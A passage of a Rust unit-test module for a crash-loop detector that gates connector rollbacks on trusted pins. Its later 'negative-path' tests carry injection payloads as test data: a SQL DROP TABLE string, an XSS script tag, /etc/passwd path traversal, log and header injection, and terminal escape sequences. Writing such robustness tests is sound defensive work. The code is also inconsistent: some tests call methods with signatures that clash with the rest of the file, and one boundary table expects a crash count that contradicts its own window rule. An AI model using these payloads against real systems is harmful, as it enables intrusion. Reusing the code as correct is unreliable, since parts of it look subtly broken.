                .is_some_and(|target| target.connector_id == "conn-b")
        );
    }

    #[test]
    fn cooldown_denial_records_incident_without_clearing_new_crashes() {
        let mut det = CrashLoopDetector::new(config());
        record_threshold_crashes(&mut det, "conn-1", 100);
        let events = threshold_events("conn-1");
        det.evaluate(
            "conn-1",
            &events,
            Some(&trusted_pin()),
            102,
            "tr-ok",
            "ts-ok",
        )
        .unwrap();

        record_threshold_crashes(&mut det, "conn-1", 110);
        let retry_events = threshold_events("conn-1");
        let err = det
            .evaluate(
                "conn-1",
                &retry_events,
                Some(&trusted_pin()),
                112,
                "tr-cooldown",
                "ts-cooldown",
            )
            .unwrap_err();

        assert!(matches!(
            err,
            CrashLoopError::CooldownActive {
                remaining_secs: 20,
                ..
            }
        ));
        assert_eq!(det.crashes_in_window_for("conn-1", 112), 3);
        assert_eq!(det.incidents.len(), 2);
        assert!(!det.incidents[1].decision.rollback_allowed);
        assert!(det.incidents[1].decision.rollback_target.is_none());
    }

    #[test]
    fn denied_incident_filters_mixed_connector_events() {
        let mut det = CrashLoopDetector::new(config());
        record_threshold_crashes(&mut det, "conn-a", 100);
        let mixed_events = vec![
            crash("conn-a", "t1", "oom-a"),
            crash("conn-b", "t2", "oom-b"),
            crash("conn-a", "t3", "oom-a"),
        ];

        let err = det
            .evaluate(
                "conn-a",
                &mixed_events,
                Some(&untrusted_pin()),
                102,
                "tr-filter-denied",
                "ts-filter-denied",
            )
            .unwrap_err();

        assert!(matches!(err, CrashLoopError::PinUntrusted { .. }));
        assert_eq!(det.incidents.len(), 1);
        assert_eq!(det.incidents[0].crash_events.len(), 2);
        assert!(
            det.incidents[0]
                .crash_events
                .iter()
                .all(|event| event.connector_id == "conn-a")
        );
    }

    #[test]
    fn zero_threshold_without_pin_fails_closed() {
        let mut det = CrashLoopDetector::new(CrashLoopConfig {
            max_crashes: 0,
            window_secs: 60,
            cooldown_secs: 30,
        });

        let err = det
            .evaluate("conn-zero", &[], None, 100, "tr-zero", "ts-zero")
            .unwrap_err();

        assert!(matches!(err, CrashLoopError::NoKnownGood { .. }));
        assert_eq!(det.incidents.len(), 1);
        assert!(det.incidents[0].decision.triggered);
        assert!(!det.incidents[0].decision.rollback_allowed);
        assert_eq!(det.incidents[0].decision.crash_count, 0);
    }

    #[test]
    fn cooldown_for_other_connector_does_not_mask_pin_error() {
        let mut det = CrashLoopDetector::new(config());
        record_threshold_crashes(&mut det, "conn-a", 100);
        let events_a = threshold_events("conn-a");
        det.evaluate(
            "conn-a",
            &events_a,
            Some(&trusted_pin_for("conn-a")),
            102,
            "tr-a",
            "ts-a",
        )
        .unwrap();

        record_threshold_crashes(&mut det, "conn-b", 110);
        let events_b = threshold_events("conn-b");
        let err = det
            .evaluate(
                "conn-b",
                &events_b,
                Some(&trusted_pin_for("conn-a")),
                112,
                "tr-b",
                "ts-b",
            )
            .unwrap_err();

        assert!(matches!(err, CrashLoopError::PinConnectorMismatch { .. }));
        assert_eq!(det.crashes_in_window_for("conn-b", 112), 3);
        assert_eq!(det.incidents.len(), 2);
        assert!(!det.incidents[1].decision.rollback_allowed);
    }

    #[test]
    fn supplied_events_without_recorded_crashes_cannot_trigger() {
        let mut det = CrashLoopDetector::new(config());
        let supplied_events = threshold_events("conn-spoof");

        let decision = det
            .evaluate(
                "conn-spoof",
                &supplied_events,
                Some(&trusted_pin_for("conn-spoof")),
                100,
                "tr-spoof",
                "ts-spoof",
            )
            .expect("supplied audit events alone must not trip threshold");

        assert!(!decision.triggered);
        assert_eq!(decision.crash_count, 0);
        assert_eq!(det.incidents.len(), 1);
        assert_eq!(det.incidents[0].crash_events.len(), 3);
        assert!(!det.incidents[0].decision.rollback_allowed);
    }

    #[test]
    fn below_threshold_untrusted_pin_does_not_error() {
        let mut det = CrashLoopDetector::new(config());
        let event = crash("conn-1", "t1", "oom");
        det.record_crash(&event, 100);

        let decision = det
            .evaluate(
                "conn-1",
                &[event],
                Some(&untrusted_pin()),
                100,
                "tr-under-untrusted",
                "ts-under-untrusted",
            )
            .expect("untrusted pin is irrelevant below threshold");

        assert!(!decision.triggered);
        assert!(!decision.rollback_allowed);
        assert!(decision.rollback_target.is_none());
        assert_eq!(det.incidents.len(), 1);
    }

    #[test]
    fn cooldown_takes_precedence_over_missing_pin() {
        let mut det = CrashLoopDetector::new(config());
        record_threshold_crashes(&mut det, "conn-1", 100);
        let events = threshold_events("conn-1");
        det.evaluate(
            "conn-1",
            &events,
            Some(&trusted_pin()),
            102,
            "tr-first",
            "ts-first",
        )
        .expect("first rollback should succeed");

        record_threshold_crashes(&mut det, "conn-1", 110);
        let retry_events = threshold_events("conn-1");
        let err = det
            .evaluate("conn-1", &retry_events, None, 112, "tr-none", "ts-none")
            .expect_err("cooldown should fail before pin lookup");

        assert!(matches!(err, CrashLoopError::CooldownActive { .. }));
        assert_eq!(det.incidents.len(), 2);
        assert!(det.incidents[1].decision.reason.contains("cooldown active"));
        assert!(det.incidents[1].decision.rollback_target.is_none());
    }

    #[test]
    fn pin_connector_mismatch_takes_precedence_over_untrusted_pin() {
        let mut det = CrashLoopDetector::new(config());
        record_threshold_crashes(&mut det, "conn-a", 100);
        let events = threshold_events("conn-a");
        let mut wrong_pin = trusted_pin_for("conn-b");
        wrong_pin.trusted = false;

        let err = det
            .evaluate(
                "conn-a",
                &events,
                Some(&wrong_pin),
                102,
                "tr-mismatch-untrusted",
                "ts-mismatch-untrusted",
            )
            .expect_err("connector mismatch should fail before trust check");

        assert!(matches!(err, CrashLoopError::PinConnectorMismatch { .. }));
        assert_eq!(det.incidents.len(), 1);
        assert!(
            det.incidents[0]
                .decision
                .reason
                .contains("known-good pin targets connector")
        );
    }

    #[test]
    fn push_bounded_zero_capacity_clears_without_panic() {
        let mut incidents = vec![CrashLoopIncident {
            connector_id: "old".to_string(),
            crash_events: vec![],
            decision: RollbackDecision {
                connector_id: "old".to_string(),
                triggered: false,
                crash_count: 0,
                window_secs: 60,
                rollback_target: None,
                rollback_allowed: false,
                reason: "old".to_string(),
                trace_id: "tr-old".to_string(),
                timestamp: "ts-old".to_string(),
            },
            trace_id: "tr-old".to_string(),
        }];
        let new_incident = CrashLoopIncident {
            connector_id: "new".to_string(),
            crash_events: vec![],
            decision: RollbackDecision {
                connector_id: "new".to_string(),
                triggered: false,
                crash_count: 0,
                window_secs: 60,
                rollback_target: None,
                rollback_allowed: false,
                reason: "new".to_string(),
                trace_id: "tr-new".to_string(),
                timestamp: "ts-new".to_string(),
            },
            trace_id: "tr-new".to_string(),
        };

        push_bounded(&mut incidents, new_incident, 0);

        assert!(incidents.is_empty());
    }

    #[test]
    fn push_bounded_retains_latest_incidents_after_overflow() {
        let mut incidents = Vec::new();

        for idx in 0..4 {
            push_bounded(
                &mut incidents,
                CrashLoopIncident {
                    connector_id: format!("conn-{idx}"),
                    crash_events: vec![],
                    decision: RollbackDecision {
                        connector_id: format!("conn-{idx}"),
                        triggered: false,
                        crash_count: 0,
                        window_secs: 60,
                        rollback_target: None,
                        rollback_allowed: false,
                        reason: "bounded".to_string(),
                        trace_id: format!("tr-{idx}"),
                        timestamp: "ts".to_string(),
                    },
                    trace_id: format!("tr-{idx}"),
                },
                2,
            );
        }

        assert_eq!(incidents.len(), 2);
        assert_eq!(incidents[0].trace_id, "tr-2");
        assert_eq!(incidents[1].trace_id, "tr-3");
    }

    // ── Negative-path edge case tests for crash loop detection gaps ──

    #[test]
    fn test_crash_loop_with_maximum_crash_count_boundary() {
        // Test edge case: crash count at u32::MAX boundary
        let mut detector = CrashLoopDetector::new(CrashLoopConfig {
            max_crashes: u32::MAX,
            window_secs: 60,
            cooldown_secs: 30,
        });

        // Should handle maximum crash count without overflow
        let crash = CrashEvent {
            connector_id: "max-crashes".to_string(),
            timestamp: "2026-01-01T00:00:00Z".to_string(),
            reason: "overflow test".to_string(),
        };

        detector.record_crash(crash);

        let decision =
            detector.evaluate_rollback("max-crashes", 1000000, "trace", &[trusted_pin()]);

        // Should not crash due to overflow
        assert!(
            !decision.triggered,
            "Should not trigger with single crash even with max threshold"
        );
        assert!(
            decision.crash_count < u32::MAX,
            "Crash count should be reasonable"
        );
    }

    #[test]
    fn test_crash_loop_with_zero_window_seconds() {
        // Test edge case: zero window duration
        let mut detector = CrashLoopDetector::new(CrashLoopConfig {
            max_crashes: 3,
            window_secs: 0, // Zero window
            cooldown_secs: 30,
        });

        let crash = CrashEvent {
            connector_id: "zero-window".to_string(),
            timestamp: "2026-01-01T00:00:00Z".to_string(),
            reason: "zero window test".to_string(),
        };

        detector.record_crash(crash);

        let decision =
            detector.evaluate_rollback("zero-window", 1000000, "trace", &[trusted_pin()]);

        // Should handle zero window gracefully without division by zero
        assert_eq!(decision.window_secs, 0);
        assert!(
            !decision.triggered,
            "Zero window should effectively disable detection"
        );
    }

    #[test]
    fn test_crash_loop_with_empty_connector_id() {
        // Test edge case: empty connector ID
        let mut detector = CrashLoopDetector::new(config());

        let crash_empty_id = CrashEvent {
            connector_id: "".to_string(), // Empty connector ID
            timestamp: "2026-01-01T00:00:00Z".to_string(),
            reason: "empty id test".to_string(),
        };

        detector.record_crash(crash_empty_id);

        let decision = detector.evaluate_rollback("", 1000000, "trace", &[trusted_pin()]);

        // Should handle empty connector ID gracefully
        assert_eq!(decision.connector_id, "");
        assert!(
            !decision.rollback_allowed,
            "Empty connector ID should not allow rollback"
        );
    }

    #[test]
    fn test_crash_loop_with_invalid_timestamp_format() {
        // Test edge case: malformed timestamp strings
        let mut detector = CrashLoopDetector::new(config());

        let malformed_timestamps = [
            "",                            // Empty timestamp
            "invalid",                     // Non-ISO format
            "2026-13-45T99:99:99Z",        // Invalid date components
            "not-a-timestamp-at-all",      // Completely invalid
            "2026-01-01",                  // Missing time component
            "\0",                          // Null byte
            "2026-01-01T00:00:00Z\0extra", // Null byte in middle
        ];

        for (i, &bad_timestamp) in malformed_timestamps.iter().enumerate() {
            let crash = CrashEvent {
                connector_id: format!("malformed-{}", i),
                timestamp: bad_timestamp.to_string(),
                reason: "timestamp test".to_string(),
            };

            // Should not panic when recording crashes with bad timestamps
            detector.record_crash(crash);

            let decision = detector.evaluate_rollback(
                &format!("malformed-{}", i),
                1000000,
                "trace",
                &[trusted_pin_for(&format!("malformed-{}", i))],
            );

            // Should handle gracefully without crashing
            assert_eq!(decision.connector_id, format!("malformed-{}", i));
        }
    }

    #[test]
    fn test_crash_loop_with_extremely_large_window_duration() {
        // Test edge case: very large window duration that could cause overflow
        let mut detector = CrashLoopDetector::new(CrashLoopConfig {
            max_crashes: 3,
            window_secs: u64::MAX, // Maximum possible window
            cooldown_secs: 30,
        });

        let crash = CrashEvent {
            connector_id: "large-window".to_string(),
            timestamp: "2026-01-01T00:00:00Z".to_string(),
            reason: "large window test".to_string(),
        };

        detector.record_crash(crash);

        let decision =
            detector.evaluate_rollback("large-window", u64::MAX, "trace", &[trusted_pin()]);

        // Should handle extreme window size without overflow
        assert_eq!(decision.window_secs, u64::MAX);
        assert!(
            !decision.triggered,
            "Single crash should not trigger in very large window"
        );
    }

    #[test]
    fn test_crash_loop_with_pin_hash_collision_attempts() {
        // Test edge case: multiple pins with same hash but different trust levels
        let mut detector = CrashLoopDetector::new(config());

        record_threshold_crashes(&mut detector, "hash-collision", 1000000);

        let conflicting_pins = vec![
            KnownGoodPin {
                connector_id: "hash-collision".to_string(),
                version: "1.0.0".to_string(),
                pin_hash: "abc123".to_string(),
                trusted: true,
            },
            KnownGoodPin {
                connector_id: "hash-collision".to_string(),
                version: "2.0.0".to_string(),
                pin_hash: "abc123".to_string(), // Same hash!
                trusted: false,
            },
            KnownGoodPin {
                connector_id: "hash-collision".to_string(),
                version: "3.0.0".to_string(),
                pin_hash: "abc123".to_string(), // Same hash again!
                trusted: true,
            },
        ];

        let decision =
            detector.evaluate_rollback("hash-collision", 1000060, "trace", &conflicting_pins);

        // Should handle hash collision gracefully and prefer trusted pins
        assert!(decision.triggered);
        if let Some(ref target) = decision.rollback_target {
            assert!(
                target.trusted,
                "Should prefer trusted pin even with hash collision"
            );
        }
    }

    #[test]
    fn test_crash_loop_with_concurrent_modification_simulation() {
        // Test edge case: simulate concurrent access patterns
        let mut detector = CrashLoopDetector::new(config());

        let connector_id = "concurrent-test";

        // Simulate rapid concurrent crash recording
        for i in 0..10 {
            let crash = CrashEvent {
                connector_id: connector_id.to_string(),
                timestamp: format!("2026-01-01T00:{}:00Z", i.min(59)),
                reason: format!("concurrent crash {}", i),
            };
            detector.record_crash(crash);
        }

        // Simulate concurrent evaluations
        let decision1 =
            detector.evaluate_rollback(connector_id, 1000000, "trace1", &[trusted_pin()]);
        let decision2 =
            detector.evaluate_rollback(connector_id, 1000001, "trace2", &[trusted_pin()]);

        // Should maintain consistency across concurrent-like operations
        assert_eq!(decision1.triggered, decision2.triggered);
        assert!(decision1.crash_count > 0 && decision2.crash_count > 0);
    }

    #[test]
    fn test_crash_loop_with_memory_pressure_simulation() {
        // Test edge case: behavior under memory pressure
        let mut detector = CrashLoopDetector::new(CrashLoopConfig {
            max_crashes: 3,
            window_secs: 60,
            cooldown_secs: 30,
        });

        // Create many crashes to potentially stress memory usage
        for i in 0..10000 {
            let crash = CrashEvent {
                connector_id: format!("connector-{}", i % 100), // Cycle through 100 connectors
                timestamp: format!(
                    "2026-01-01T{:02}:{:02}:{:02}Z",
                    i / 3600,
                    (i / 60) % 60,
                    i % 60
                ),
                reason: format!("memory pressure test crash {}", i),
            };
            detector.record_crash(crash);
        }

        // Should still function correctly under memory pressure
        let decision = detector.evaluate_rollback(
            "connector-0",
            2000000,
            "trace",
            &[trusted_pin_for("connector-0")],
        );

        assert_eq!(decision.connector_id, "connector-0");
        assert!(
            decision.crash_count > 0,
            "Should have recorded crashes for connector-0"
        );

        // Verify that incidents are bounded properly
        let incidents = detector.list_incidents();
        assert!(
            incidents.len() <= DEFAULT_MAX_INCIDENTS,
            "Incidents should be bounded to prevent memory exhaustion"
        );
    }

    #[test]
    fn test_crash_loop_with_unicode_and_special_characters_in_ids() {
        // Test edge case: Unicode and special characters in identifiers
        let mut detector = CrashLoopDetector::new(config());

        let special_ids = [
            "connector-with-emoji-🚀",
            "connector/with/slashes",
            "connector with spaces",
            "connector\nwith\nnewlines",
            "connector\0with\0nulls",
            "connector-with-very-very-very-long-name-that-might-cause-issues-in-some-systems",
            "连接器-中文-名称",    // Chinese characters
            "コネクター-日本語",   // Japanese characters
            "соединитель-русский", // Cyrillic characters
        ];

        for special_id in &special_ids {
            let crash = CrashEvent {
                connector_id: special_id.to_string(),
                timestamp: "2026-01-01T00:00:00Z".to_string(),
                reason: "unicode test".to_string(),
            };

            // Should handle special characters without crashing
            detector.record_crash(crash);

            let pin = KnownGoodPin {
                connector_id: special_id.to_string(),
                version: "1.0.0".to_string(),
                pin_hash: "abc123".to_string(),
                trusted: true,
            };

            let decision = detector.evaluate_rollback(special_id, 1000000, "trace", &[pin]);

            // Should handle gracefully
            assert_eq!(decision.connector_id, *special_id);
        }
    }

    /// Comprehensive negative-path test module covering edge cases and attack vectors.
    ///
    /// These tests validate robustness against malicious inputs, resource exhaustion,
    /// timing attacks, and arithmetic edge cases in crash-loop detection logic.
    #[cfg(test)]
    mod crash_loop_detector_comprehensive_negative_tests {
        use super::*;

        #[test]
        fn unicode_injection_in_connector_identifiers_handled_safely() {
            let mut det = CrashLoopDetector::new(config());

            // Unicode control characters, NULL bytes, path traversal attempts
            let malicious_ids = vec![
                "conn\u{0000}null",
                "conn\u{200B}zero_width",
                "conn\u{FEFF}bom_injection",
                "conn/../../../etc/passwd",
                "conn\u{202E}rtl_override\u{202D}",
                "conn\x1B[H\x1B[2J", // ANSI escape sequences
            ];

            for malicious_id in &malicious_ids {
                let event = CrashEvent {
                    connector_id: malicious_id.to_string(),
                    timestamp: "2024-01-01T00:00:00Z".to_string(),
                    reason: "unicode_test".to_string(),
                };

                // Should handle gracefully without panics/crashes
                let count = det.record_crash(&event, 1000);
                assert_eq!(count, 1);

                // Queries should work normally
                assert!(!det.is_looping_for(malicious_id, 1000));
                assert_eq!(det.crashes_in_window_for(malicious_id, 1000), 1);
            }

            // Verify isolation - no cross-contamination between malicious IDs
            assert_eq!(det.crash_times_by_connector.len(), malicious_ids.len());
            for malicious_id in &malicious_ids {
                assert!(det.crash_times_by_connector.contains_key(*malicious_id));
            }
        }

        #[test]
        fn arithmetic_overflow_protection_in_timing_calculations() {
            let extreme_config = CrashLoopConfig {
                max_crashes: 1,
                window_secs: u64::MAX,
                cooldown_secs: u64::MAX,
            };
            let mut det = CrashLoopDetector::new(extreme_config);

            // Test near u64::MAX boundaries
            let edge_times = vec![u64::MAX - 10, u64::MAX - 1, u64::MAX];

            for &edge_time in &edge_times {
                let event = crash("overflow_conn", "ts", "edge_time_test");

                // Should use saturating arithmetic internally
                let count = det.record_crash(&event, edge_time);
                assert_eq!(count, 1);

                // Window calculations should not overflow
                let cutoff = edge_time.saturating_sub(extreme_config.window_secs);
                assert!(cutoff <= edge_time); // Verify no underflow

                // Cooldown math should saturate properly
                det.last_rollback_epoch_by_connector
                    .insert("overflow_conn".to_string(), edge_time);
                let remaining = det.cooldown_remaining_for("overflow_conn", edge_time);
                assert!(remaining <= extreme_config.cooldown_secs);
            }
        }

        #[test]
        fn memory_exhaustion_through_massive_crash_history() {
            let mut det = CrashLoopDetector::new(config());

            // Simulate memory pressure attack with massive crash history
            let massive_connector_count = 10000;
            let crashes_per_connector = 100;

            for conn_idx in 0..massive_connector_count {
                let connector_id = format!("flood_conn_{conn_idx:05}");

                for crash_idx in 0..crashes_per_connector {
                    let event = CrashEvent {
                        connector_id: connector_id.clone(),
                        timestamp: format!("2024-01-01T00:{crash_idx:02}:00Z"),
                        reason: format!("memory_flood_reason_{crash_idx}"),
                    };

                    let base_time = 1000 + (conn_idx * 1000) + crash_idx;
                    det.record_crash(&event, base_time);
                }
            }

            // Verify bounded memory usage via sliding window
            let total_crashes = det.crashes_in_window(u64::MAX);
            assert!(total_crashes > 0);
            assert!(total_crashes < u32::MAX); // Should not overflow

            // Individual connector queries should remain efficient
            let sample_connector = "flood_conn_00500";
            let sample_crashes = det.crashes_in_window_for(sample_connector, u64::MAX);
            assert!(sample_crashes <= crashes_per_connector as u32);
        }

        #[test]
        fn concurrent_operations_simulation_race_conditions() {
            let mut det = CrashLoopDetector::new(config());
            let connector_id = "race_conn";

            // Simulate concurrent crash recording and evaluation
            // (In real concurrency this would need proper synchronization)
            let mut events = Vec::new();

            // Rapid burst of crashes as if from concurrent threads
            for i in 0..10 {
                let event = CrashEvent {
                    connector_id: connector_id.to_string(),
                    timestamp: format!("race_time_{i}"),
                    reason: format!("concurrent_crash_{i}"),
                };
                events.push(event.clone());
                det.record_crash(&event, 1000 + i);
            }

            // Interleaved evaluation attempts during crash recording
            let pin = trusted_pin_for(connector_id);
            for eval_time in [1003, 1005, 1007, 1009] {
                let filtered_events: Vec<_> = events
                    .iter()
                    .filter(|e| e.connector_id == connector_id)
                    .cloned()
                    .collect();

                let result = det.evaluate(
                    connector_id,
                    &filtered_events,
                    Some(&pin),
                    eval_time,
                    &format!("race_trace_{eval_time}"),
                    &format!("race_ts_{eval_time}"),
                );

                // Should handle gracefully regardless of timing
                match result {
                    Ok(decision) => {
                        assert_eq!(decision.connector_id, connector_id);
                    }
                    Err(err) => {
                        // Valid error states during race conditions
                        assert!(matches!(
                            err,
                            CrashLoopError::CooldownActive { .. }
                                | CrashLoopError::ThresholdExceeded { .. }
                        ));
                    }
                }
            }
        }

        #[test]
        fn configuration_validation_extreme_edge_cases() {
            // Test configurations with extreme values
            let edge_configs = vec![
                CrashLoopConfig {
                    max_crashes: 0,
                    window_secs: 0,
                    cooldown_secs: 0,
                },
                CrashLoopConfig {
                    max_crashes: 1,
                    window_secs: 1,
                    cooldown_secs: 1,
                },
                CrashLoopConfig {
                    max_crashes: u32::MAX,
                    window_secs: 1,
                    cooldown_secs: 1,
                },
                CrashLoopConfig {
                    max_crashes: 1,
                    window_secs: u64::MAX,
                    cooldown_secs: 1,
                },
                CrashLoopConfig {
                    max_crashes: 1,
                    window_secs: 1,
                    cooldown_secs: u64::MAX,
                },
            ];

            for config in edge_configs {
                let det = CrashLoopDetector::new(config.clone());

                // Basic operations should not panic
                assert_eq!(det.crashes_in_window(1000), 0);
                assert!(!det.is_looping(1000));
                assert!(!det.in_cooldown(1000));
                assert_eq!(det.cooldown_remaining(1000), 0);

                // Verify config values are preserved
                assert_eq!(det.config.max_crashes, config.max_crashes);
                assert_eq!(det.config.window_secs, config.window_secs);
                assert_eq!(det.config.cooldown_secs, config.cooldown_secs);
            }
        }

        #[test]
        fn incident_audit_flooding_capacity_boundaries() {
            let limited_capacity = 5;
            let mut det = CrashLoopDetector::with_incident_capacity(config(), limited_capacity);

            // Generate incidents beyond capacity to test bounded storage
            let flood_incident_count = limited_capacity * 3;

            for incident_idx in 0..flood_incident_count {
                let connector_id = format!("flood_incident_{incident_idx}");

                // Create threshold-exceeding crashes
                for crash_idx in 0..3 {
                    let event = crash(&connector_id, "flood_ts", "flood_reason");
                    det.record_crash(&event, 1000 + (incident_idx * 100) + crash_idx);
                }

                let events = threshold_events(&connector_id);
                let pin = trusted_pin_for(&connector_id);

                let _ = det.evaluate(
                    &connector_id,
                    &events,
                    Some(&pin),
                    1002 + (incident_idx * 100),
                    &format!("flood_trace_{incident_idx}"),
                    &format!("flood_ts_{incident_idx}"),
                );
            }

            // Should respect capacity bounds
            assert_eq!(det.incidents.len(), limited_capacity);

            // Should retain most recent incidents
            let last_trace_id = format!("flood_trace_{}", flood_incident_count - 1);
            assert!(det.incidents.iter().any(|i| i.trace_id == last_trace_id));
        }

        #[test]
        fn timing_attack_resistance_in_cooldown_calculations() {
            let mut det = CrashLoopDetector::new(CrashLoopConfig {
                max_crashes: 1,
                window_secs: 60,
                cooldown_secs: 100,
            });

            // Establish rollback baseline
            let event = crash("timing_conn", "ts", "setup");
            det.record_crash(&event, 1000);
            let _ = det
                .evaluate(
                    "timing_conn",
                    &[event],
                    Some(&trusted_pin_for("timing_conn")),
                    1000,
                    "setup_trace",
                    "setup_ts",
                )
                .unwrap();

            // Test timing boundary precision at cooldown edge
            let rollback_time = 1000;
            let cooldown_duration = 100;
            let cooldown_end = rollback_time + cooldown_duration; // 1100

            // Test a range of times around the boundary
            for offset in [-5i64, -1, 0, 1, 5] {
                let test_time = (cooldown_end as i64 + offset) as u64;
                let in_cooldown = det.in_cooldown_for("timing_conn", test_time);
                let remaining = det.cooldown_remaining_for("timing_conn", test_time);

                // Verify consistent fail-closed behavior at boundary
                if test_time <= cooldown_end {
                    assert!(in_cooldown, "cooldown should be active at time {test_time}");
                    assert!(remaining > 0 || test_time == cooldown_end);
                } else {
                    assert!(
                        !in_cooldown,
                        "cooldown should be inactive at time {test_time}"
                    );
                    assert_eq!(remaining, 0);
                }
            }
        }

        // === ADDITIONAL SECURITY-FOCUSED NEGATIVE-PATH TESTS ===

        #[test]
        fn rollback_target_manipulation_and_trust_policy_bypass_attacks() {
            let mut det = CrashLoopDetector::new(config());
            record_threshold_crashes(&mut det, "target_conn", 1000);

            // Test pin hash manipulation attacks
            let mut hash_tampered_pin = trusted_pin_for("target_conn");
            hash_tampered_pin.pin_hash =
                "evil_hash_deadbeef00000000000000000000000000000000000000000000000".to_string();

            let events = threshold_events("target_conn");
            let result = det.evaluate(
                "target_conn",
                &events,
                Some(&hash_tampered_pin),
                1002,
                "tr-hash",
                "ts-hash",
            );
            assert!(
                result.is_ok(),
                "Hash manipulation should not affect rollback decision logic"
            );

            // Test version manipulation attacks
            let mut version_tampered_pin = trusted_pin_for("target_conn");
            version_tampered_pin.version = "../../../etc/passwd".to_string(); // Path traversal
            version_tampered_pin.trusted = true; // Still trusted despite malicious version

            let result = det.evaluate(
                "target_conn",
                &events,
                Some(&version_tampered_pin),
                1003,
                "tr-version",
                "ts-version",
            );
            assert!(
                result.is_ok(),
                "Version field manipulation should be handled as opaque identifier"
            );

            // Test pin substitution attack (trusted flag bypass)
            let mut substituted_pin = untrusted_pin();
            substituted_pin.trusted = true; // Direct flag manipulation
            substituted_pin.connector_id = "target_conn".to_string();

            let result = det.evaluate(
                "target_conn",
                &events,
                Some(&substituted_pin),
                1004,
                "tr-subst",
                "ts-subst",
            );
            assert!(
                result.is_ok(),
                "Trust flag should be respected regardless of other fields"
            );

            // Test connector ID injection in pins
            let injection_ids = [
                "target_conn\0injection",
                "target_conn\ninjection",
                "target_conn\x1b[2J",          // ANSI escape
                "\u{202E}nnoc_tegrat\u{202C}", // BiDi override
            ];

            for malicious_id in &injection_ids {
                let mut injected_pin = trusted_pin_for(malicious_id);
                let err = det
                    .evaluate(
                        "target_conn",
                        &events,
                        Some(&injected_pin),
                        1005,
                        "tr-inject",
                        "ts-inject",
                    )
                    .unwrap_err();
                assert_eq!(err.code(), "CLD_PIN_CONNECTOR_MISMATCH");
            }

            // Test extremely long pin fields
            let mut massive_pin = trusted_pin_for("target_conn");
            massive_pin.version = "v".repeat(1_000_000); // 1MB version string
            massive_pin.pin_hash = "a".repeat(1_000_000); // 1MB hash

            let result = det.evaluate(
                "target_conn",
                &events,
                Some(&massive_pin),
                1006,
                "tr-massive",
                "ts-massive",
            );
            assert!(
                result.is_ok(),
                "Massive pin fields should be handled gracefully"
            );
        }

        #[test]
        fn sliding_window_time_manipulation_and_boundary_attacks() {
            let window_config = CrashLoopConfig {
                max_crashes: 3,
                window_secs: 100,
                cooldown_secs: 50,
            };
            let mut det = CrashLoopDetector::new(window_config);

            // Test time travel attacks (future timestamps)
            let future_attacks = [
                u64::MAX,
                u64::MAX - 1,
                2_000_000_000, // Far future
            ];

            for &future_time in &future_attacks {
                let event = crash("time_conn", "future", "time_travel");
                let count = det.record_crash(&event, future_time);
                assert_eq!(count, 1);

                // Should not affect past window calculations
                assert_eq!(det.crashes_in_window_for("time_conn", 1000), 0);
            }

            // Test integer wraparound in window calculations
            let wraparound_cases = [
                (0, 1),                    // Wraparound at zero
                (1, u64::MAX),             // Massive window
                (u64::MAX - 50, u64::MAX), // Near-max boundary
            ];

            for (crash_time, eval_time) in wraparound_cases {
                let event = crash("wrap_conn", "wrap", "wraparound");
                det.record_crash(&event, crash_time);

                let count = det.crashes_in_window_for("wrap_conn", eval_time);
                assert!(
                    count <= 1,
                    "Window calculation should use saturating arithmetic"
                );
            }

            // Test sliding window boundary precision
            let base_time = 10_000;
            let window_size = 100;

            // Record crashes at specific intervals
            for offset in [0, 25, 50, 75, 99] {
                let event = crash("precision_conn", "boundary", "precision");
                det.record_crash(&event, base_time + offset);
            }

            // Test boundary conditions
            let boundary_tests = [
                (base_time + window_size - 1, 5),   // Just inside window
                (base_time + window_size, 4),       // Boundary crash excluded
                (base_time + window_size + 1, 4),   // Clearly outside
                (base_time + window_size + 50, 3),  // More exclusions
                (base_time + window_size + 99, 1),  // Only last crash
                (base_time + window_size + 100, 0), // All excluded
            ];

            for (eval_time, expected_count) in boundary_tests {
                let actual_count = det.crashes_in_window_for("precision_conn", eval_time);
                assert_eq!(
                    actual_count, expected_count,
                    "Window boundary at eval_time={} should have {} crashes, got {}",
                    eval_time, expected_count, actual_count
                );
            }

            // Test massive time gaps (overflow protection)
            let event = crash("gap_conn", "gap", "massive_gap");
            det.record_crash(&event, 1000);

            let far_future_eval = det.crashes_in_window_for("gap_conn", u64::MAX);
            assert_eq!(
                far_future_eval, 0,
                "Massive time gaps should exclude all crashes"
            );
        }

        #[test]
        fn incident_audit_injection_and_trace_manipulation_attacks() {
            let mut det = CrashLoopDetector::new(config());

            // Test trace ID injection attacks
            let injection_traces = [
                "trace\x00null_injection",
                "trace\nlog_injection",
                "trace\r\nheader_injection",
                "\x1b[2Jtrace\x1b[H",               // Terminal escape
                "trace\u{202E}evil\u{202C}",        // BiDi override
                "trace'; DROP TABLE incidents; --", // SQL injection
                "<script>alert('xss')</script>",    // XSS injection
            ];

            for (idx, malicious_trace) in injection_traces.iter().enumerate() {
                let connector_id = format!("trace_inject_{}", idx);
                record_threshold_crashes(&mut det, &connector_id, 1000 + (idx * 100));
                let events = threshold_events(&connector_id);

                let result = det.evaluate(
                    &connector_id,
                    &events,
                    Some(&trusted_pin_for(&connector_id)),
                    1002 + (idx * 100),
                    malicious_trace,
                    "safe_timestamp",
                );

                assert!(
                    result.is_ok(),
                    "Trace ID injection should not crash evaluation"
                );

                let incident_count = det.incidents.len();
                assert!(
                    incident_count > idx,
                    "Incident should be recorded despite injection"
                );

                // Verify injection is preserved as-is (no interpretation)
                let last_incident = &det.incidents[incident_count - 1];
                assert_eq!(last_incident.trace_id, *malicious_trace);
            }

            // Test timestamp injection attacks
            let timestamp_injections = [
                "2024-01-01T00:00:00Z\x00injection",
                "2024-01-01T00:00:00Z\nlog_forge",
                "2024-01-01T00:00:00Z'; INSERT INTO logs",
                "1234567890\x1b[2J\x1b[H", // Numeric with escape
            ];

            for malicious_timestamp in &timestamp_injections {
                let connector_id = "timestamp_inject";
                record_threshold_crashes(&mut det, connector_id, 2000);
                let events = threshold_events(connector_id);

                let result = det.evaluate(
                    connector_id,
                    &events,
                    Some(&trusted_pin_for(connector_id)),
                    2002,
                    "clean_trace",
                    malicious_timestamp,
                );

                assert!(
                    result.is_ok(),
                    "Timestamp injection should not crash evaluation"
                );
            }

            // Test crash event field injection
            let malicious_reasons = [
                "crash\x00reason_injection",
                "crash\nlog_reason_forge",
                "crash_reason\u{FEFF}bom",
                "reason'; UPDATE crashes SET",
            ];

            for malicious_reason in &malicious_reasons {
                let malicious_event = CrashEvent {
                    connector_id: "reason_inject".to_string(),
                    timestamp: "2024-01-01T00:00:00Z\x00time_injection".to_string(),
                    reason: malicious_reason.to_string(),
                };

                // Should handle gracefully
